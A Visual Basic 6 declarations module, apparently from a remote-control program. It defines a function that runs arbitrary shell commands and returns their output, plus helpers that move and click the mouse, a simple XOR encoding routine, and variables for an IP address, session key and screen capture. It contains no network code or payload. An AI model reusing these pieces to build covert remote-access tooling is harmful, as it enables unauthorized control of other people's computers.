Attribute VB_Name = "modDeclares"
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function BringWindowToTop Lib "user32" (ByVal hWnd As Long) As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Sub mouse_event Lib "user32" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)
Public Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
Public Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
    
Public Const MOUSEEVENTF_LEFTDOWN = &H2
Public Const MOUSEEVENTF_LEFTUP = &H4
Public Const MOUSEEVENTF_MIDDLEDOWN = &H20
Public Const MOUSEEVENTF_MIDDLEUP = &H40
Public Const MOUSEEVENTF_RIGHTDOWN = &H8
Public Const MOUSEEVENTF_RIGHTUP = &H10
Public Const MOUSEEVENTF_MOVE = &H1

Public Type POINTAPI
    x As Long
    y As Long
End Type

'The CreatePipe function creates an anonymous pipe,
'and returns handles to the read and write ends of the pipe.
Public Declare Function CreatePipe Lib "kernel32" ( _
    phReadPipe As Long, _
    phWritePipe As Long, _
    lpPipeAttributes As Any, _
    ByVal nSize As Long) As Long

'Used to read the the pipe filled by the process create
'with the CretaProcessA function
Public Declare Function ReadFile Lib "kernel32" ( _
    ByVal hFile As Long, _
    ByVal lpBuffer As String, _
    ByVal nNumberOfBytesToRead As Long, _
    lpNumberOfBytesRead As Long, _
    ByVal lpOverlapped As Any) As Long

'Structure used by the CreateProcessA function
Public Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

'Structure used by the CreateProcessA function
Public Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

'Structure used by the CreateProcessA function
Public Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadID As Long
End Type

'This function launch the the commend and return the relative process
'into the PRECESS_INFORMATION structure
Public Declare Function CreateProcessA Lib "kernel32" ( _
    ByVal lpApplicationName As Long, _
    ByVal lpCommandLine As String, _
    lpProcessAttributes As SECURITY_ATTRIBUTES, _
    lpThreadAttributes As SECURITY_ATTRIBUTES, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As Long, _
    ByVal lpCurrentDirectory As Long, _
    lpStartupInfo As STARTUPINFO, _
    lpProcessInformation As PROCESS_INFORMATION) As Long

'Close opened handle
Public Declare Function CloseHandle Lib "kernel32" ( _
    ByVal hHandle As Long) As Long

'Consts for the above functions
Public Const NORMAL_PRIORITY_CLASS = &H20&
Public Const STARTF_USESTDHANDLES = &H100&
Public Const STARTF_USESHOWWINDOW = &H1



'project's public variables
Public redir As Byte
Public rasp As String
Public Inc As Byte
Public sc As Byte
Public file As String
Public ip As String
Public cont As Byte
Public ack As String
Public conNr As Integer
Public sc1(100) As Byte
Public sc2(100) As Byte
Public sessKey As String
Public caca As Byte
Public sdx As Long
Public sdy As Long
Public scrPos(1) As Long
Public capScreen As Byte
Public strOptSend As String


'project's public functions
Public Function JPath(ByVal s As String) As String
    i = Len(s)
    Do While Mid(s, i, 1) <> "\"
        i = i - 1
        If i = 0 Then Exit Do
    Loop
    If i > 1 Then
        JPath = Left(s, i)
    Else
    JPath = s & "\"
    End If
End Function

Public Function JustPath(ByVal s As String) As String
    i = Len(s)
    Do While Mid(s, i, 1) <> "\"
        i = i - 1
        If i = 0 Then Exit Do
    Loop
    If i > 1 Then
        JustPath = Left(s, i)
    Else
    JustPath = CurDir()
    End If
End Function
Public Function JustName(ByVal s As String) As String
    i = Len(s)
    Do While Mid(s, i, 1) <> "\"
        i = i - 1
        If i = 0 Then Exit Do
    Loop
    If i > 1 Then
        JustName = Right(s, Len(s) - i)
    Else
    JustName = s
    End If
End Function

Public Function fulln(ByVal s As String) As String
    If Right(s, 1) <> "\" Then
        fulln = s + "\"
    Else
        fulln = s
    End If
End Function


Public Function encdec(ByVal key As String, ByVal encstr As String)
    For i = 1 To Len(encstr)
        encdec = encdec & Chr(asc(Mid(key, (i Mod 20) + 1, 1)) Xor asc(Mid(encstr, i, 1)))
    Next i
End Function

Public Function ExecuteCommand(ByVal CommandLine As String) As String
On Error GoTo errore
    Dim proc As PROCESS_INFORMATION     'Process info filled by CreateProcessA
    Dim Ret As Long                     'long variable for get the return value of the
                                        'API functions
    Dim start As STARTUPINFO            'StartUp Info passed to the CreateProceeeA
                                        'function
    Dim sa As SECURITY_ATTRIBUTES       'Security Attributes passeed to the
                                        'CreateProcessA function
    Dim hReadPipe As Long               'Read Pipe handle created by CreatePipe
    Dim hWritePipe As Long              'Write Pite handle created by CreatePipe
    Dim lngBytesread As Long            'Amount of byte read from the Read Pipe handle
    Dim strBuff As String * 256         'String buffer reading the Pipe

    'Create the Pipe
    sa.nLength = Len(sa)
    sa.bInheritHandle = 1&
    sa.lpSecurityDescriptor = 0&
    Ret = CreatePipe(hReadPipe, hWritePipe, sa, 0)
    
    If Ret = 0 Then
        'If an error occur during the Pipe creation exit
        ExecuteCommand = "CreatePipe failed. Error: " & Err.LastDllError
        Exit Function
    End If
    
    'Launch the command line application
    start.cb = Len(start)
    start.dwFlags = STARTF_USESTDHANDLES Or STARTF_USESHOWWINDOW
    'set the StdOutput and the StdError output to the same Write Pipe handle
    start.hStdOutput = hWritePipe
    start.hStdError = hWritePipe
    'Execute the command
    mCommand = Environ("COMSPEC") + " /c " + CommandLine
    Ret& = CreateProcessA(0&, mCommand, sa, sa, 1&, _
        NORMAL_PRIORITY_CLASS, 0&, 0&, start, proc)
        
    If Ret <> 1 Then
        'if the command is not found ....
        ExecuteCommand = "file or command not found."
        Exit Function
    End If
    
    'Now We can ... must close the hWritePipe
    Ret = CloseHandle(hWritePipe)
    mOutputs = ""
    
    'Read the ReadPipe handle
    Do
        Ret = ReadFile(hReadPipe, strBuff, 256, lngBytesread, 0&)
        mOutputs = mOutputs & Left(strBuff, lngBytesread)
    Loop While Ret <> 0
    
    'Close the opened handles
    Ret = CloseHandle(proc.hProcess)
    Ret = CloseHandle(proc.hThread)
    Ret = CloseHandle(hReadPipe)
    
    'Return the Outputs property with the entire DOS output
    ExecuteCommand = mOutputs
    Exit Function
errore:
    ExecuteCommand = "error:" + Err.Description
End Function

Public Function GetX() As Long
    Dim n As POINTAPI
    GetCursorPos n
    GetX = n.x
End Function
Public Function GetY() As Long
    Dim n As POINTAPI
    GetCursorPos n
    GetY = n.y
End Function
Public Sub LeftClick()
    LeftDown
    LeftUp
End Sub
Public Sub LeftDown()
    mouse_event MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0
End Sub
Public Sub LeftUp()
    mouse_event MOUSEEVENTF_LEFTUP, 0, 0, 0, 0
End Sub
Public Sub MiddleClick()
    MiddleDown
    MiddleUp
End Sub
Public Sub MiddleDown()
    mouse_event MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0
End Sub
Public Sub MiddleUp()
    mouse_event MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0
End Sub
Public Sub MoveMouse(xMove As Long, yMove As Long)
    mouse_event MOUSEEVENTF_MOVE, xMove, yMove, 0, 0
End Sub
Public Sub RightClick()
    RightDown
    RightUp
End Sub
Public Sub RightDown()
    mouse_event MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0
End Sub
Public Sub RightUp()
    mouse_event MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0
End Sub
Public Sub SetMousePos(xPos As Long, yPos As Long)
    SetCursorPos xPos, yPos
End Sub

